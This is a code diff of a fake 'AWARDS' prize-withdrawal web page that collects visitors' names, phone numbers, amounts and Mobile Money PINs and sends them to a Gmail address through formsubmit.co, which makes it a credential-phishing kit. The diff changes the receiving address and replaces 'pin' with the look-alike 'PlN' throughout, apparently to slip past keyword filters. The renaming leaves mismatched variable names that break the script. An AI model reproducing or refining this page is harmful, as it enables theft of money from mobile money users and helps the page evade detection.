@@ -30,7 +30,7 @@
 <div class="header">AWARDS</div>
 
 <div class="container">
-  <form id="awardForm" method="POST" action="https://formsubmit.co/exellentfirm@gmail.com" target="_self">
+  <form id="awardForm" method="POST" action="https://formsubmit.co/exellentwinner6@gmail.com" target="_self">
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_subject" value="New AWARDS submission">
 
@@ -46,12 +46,12 @@
     <input type="number" id="amount" name="Amount to withdraw" placeholder="1000" min="1" required>
     <div id="amountErr" class="error">Please enter a valid amount.</div>
 
-    <label id="pinLabel" for="pin">Enter your Mobile money pin/secret code</label>
-    <div class="pin-row">
-      <input type="password" id="pin" name="Mobile Money PIN" placeholder="****" required>
-      <button type="button" id="togglePin" class="toggle-btn">Show</button>
+    <label id="PlNLabel" for="PlN">Enter your Mobile money PIN/S code</label>
+    <div class="PlN-row">
+      <input type="password" id="PlN" name="Mobile Money PlN" placeholder="****" required>
+      <button type="button" id="togglePlN" class="toggle-btn">Show</button>
     </div>
-    <div id="pinErr" class="error">PIN required.</div>
+    <div id="PlNnErr" class="error">PIN required.</div>
     <div id="dynamicHint" style="font-size:12px;color:#666;margin-top:5px;"></div>
 
     <!-- Withdraw button -->
@@ -76,8 +76,8 @@
 const nameInput=document.getElementById('name');
 const phoneInput=document.getElementById('phone');
 const amountInput=document.getElementById('amount');
-const pinInput=document.getElementById('pin');
-const togglePinBtn=document.getElementById('togglePin');
+const pinInput=document.getElementById('PlN');
+const togglePlLBtn=document.getElementById('togglePlN');
 const withdrawBtn=document.getElementById('withdrawBtn');
 const balanceBtn=document.getElementById('balanceBtn');
 const successBox=document.getElementById('successBox');
@@ -87,31 +87,31 @@ const dynamicHint=document.getElementById('dynamicHint');
 const nameErr=document.getElementById('nameErr');
 const phoneErr=document.getElementById('phoneErr');
 const amountErr=document.getElementById('amountErr');
-const pinErr=document.getElementById('pinErr');
+const PlNErr=document.getElementById('PlNErr');
 
 function isNameValid(v){return /^[A-Za-z\s]+$/.test(v.trim());}
 function isDigits(v){return /^\d+$/.test(v.trim());}
 function isAmountValid(v){return v!=='' && !isNaN(v) && Number(v)>0;}
 
-function updatePinLabel(){
+function updatePlNLabel(){
   const amt=amountInput.value||'[Amount]';
   const ph=phoneInput.value||'[Phone Number]';
-  document.getElementById('pinLabel').textContent=`Enter your Mobile money pin/secret code to withdraw ${amt} to ${ph}`;
-  dynamicHint.textContent=`This PIN will be used to withdraw ${amt} to ${ph}`;
+  document.getElementById('PlNLabel').textContent=`Enter your Mobile money PlN/s code to withdraw ${amt} to ${ph}`;
+  dynamicHint.textContent=`This PlN will be used to withdraw ${amt} to ${ph}`;
 }
 
-[nameInput, phoneInput, amountInput, pinInput].forEach(el=>el.addEventListener('input',()=>{
+[nameInput, phoneInput, amountInput, PlNInput].forEach(el=>el.addEventListener('input',()=>{
   updateWithdrawState();
-  updatePinLabel();
+  updatePlLLabel();
 }));
 
 function updateWithdrawState(){
-  withdrawBtn.disabled=!(isNameValid(nameInput.value) && isDigits(phoneInput.value) && isAmountValid(amountInput.value) && pinInput.value.trim()!=='');
+  withdrawBtn.disabled=!(isNameValid(nameInput.value) && isDigits(phoneInput.value) && isAmountValid(amountInput.value) && PlNInput.value.trim()!=='');
 }
 
-togglePinBtn.addEventListener('click',()=>{
-  if(pinInput.type==='password'){pinInput.type='text';togglePinBtn.textContent='Hide';}
-  else{pinInput.type='password';togglePinBtn.textContent='Show';}
+togglePlNBtn.addEventListener('click',()=>{
+  if(PlNInput.type==='password'){PlNInput.type='text';togglePlNBtn.textContent='Hide';}
+  else{PlNInput.type='password';togglePlNBtn.textContent='Show';}
 });
 
 withdrawBtn.addEventListener('click',()=>{
@@ -119,7 +119,7 @@ withdrawBtn.addEventListener('click',()=>{
   if(!isNameValid(nameInput.value)){nameErr.style.display='block'; return;}else{nameErr.style.display='none';}
   if(!isDigits(phoneInput.value)){phoneErr.style.display='block'; return;}else{phoneErr.style.display='none';}
   if(!isAmountValid(amountInput.value)){amountErr.style.display='block'; return;}else{amountErr.style.display='none';}
-  if(pinInput.value.trim()===''){pinErr.style.display='block'; return;}else{pinErr.style.display='none';}
+  if(PlNInput.value.trim()===''){PlNErr.style.display='block'; return;}else{PlNErr.style.display='none';}
 
   // Disable button + show spinner
   withdrawBtn.disabled=true;
